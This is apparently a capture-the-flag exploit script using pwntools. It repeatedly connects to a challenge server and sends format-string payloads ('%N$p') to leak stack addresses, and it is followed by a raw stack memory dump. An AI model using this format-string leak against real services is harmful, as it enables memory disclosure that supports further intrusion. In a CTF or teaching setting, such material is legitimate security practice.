from pwn import *

#p=process("./cookie_monster")

for num in range(1,40):
	p=remote('dorsia3.wpictf.xyz', 31337)
	payload = "|%"+str(num)+"$p|"
	print p.recvline()
	p.sendline(payload)
	stack =  p.recvline().split('|')[1]
	if stack == "(nil)":
		continue;
	addr = int(stack,16)
	print "leaked addr"+str(num)+": "+hex(addr)
	p.close()
	p.shutdown()

0xffffcde4:	0x080485a6	0xf7faf5c0	0x080484ad	0x00000000
0xffffcdf4:	0x00000000	0x41000000	0x000a4342	0x00000009
0xffffce04:	0xffffd0d8	0xf7e074a9	0xf7fb2748	0xf7faf000
0xffffce14:	0xf7faf000	0x00000000	0xf7e0760b	0xf7faf3fc
0xffffce24:	0x00000000	0xffffcefc	0x0804856b	0x00000001
0xffffce34:	0xffffcef4	0xffffcefc	0x08048541	0xffffce60
0xffffce44:	0x00000000	0x00000000	0xf7defe81	0xf7faf000
0xffffce54:	0xf7faf000	0x00000000	0xf7defe81	0x00000001
0xffffce64:	0xffffcef4	0xffffcefc	0xffffce84	0x00000001
0xffffce74:	0x00000000	0xf7faf000	0xf7fe575a	0xf7ffd000
0xffffce84:	0x00000000	0xf7faf000	0x00000000	0x00000000
0xffffce94:	0xb874f34b	0xfa14b55b	0x00000000	0x00000000
0xffffcea4:	0x00000000	0x00000001	0x08048380	0x00000000
0xffffceb4:	0xf7feae20	0xf7fe59b0	0x0804a000	0x00000001
0xffffcec4:	0x08048380	0x00000000	0x080483b2	0x08048496
0xffffced4:	0x00000001	0xffffcef4	0x08048520	0x08048580
0xffffcee4:	0xf7fe59b0	0xffffceec	0xf7ffd940	0x00000001
0xffffcef4:	0xffffd0d8	0x00000000	0xffffd10f	0xffffd125
0xffffcf04:	0xffffd711	0xffffd72c	0xffffd74e	0xffffd763
0xffffcf14:	0xffffd7a1	0xffffd7b9	0xffffd7d0	0xffffd7df
0xffffcf24:	0xffffd7f0	0xffffd7fb	0xffffd82b	0xffffd84b
0xffffcf34:	0xffffd85f	0xffffd8a5	0xffffd8b8	0xffffd8c3
0xffffcf44:	0xffffd8e7	0xffffd910	0xffffd946	0xffffd95a
0xffffcf54:	0xffffd96d	0xffffd97c	0xffffd993	0xffffd9a5
0xffffcf64:	0xffffd9c6	0xffffd9f9	0xffffda2e	0xffffda37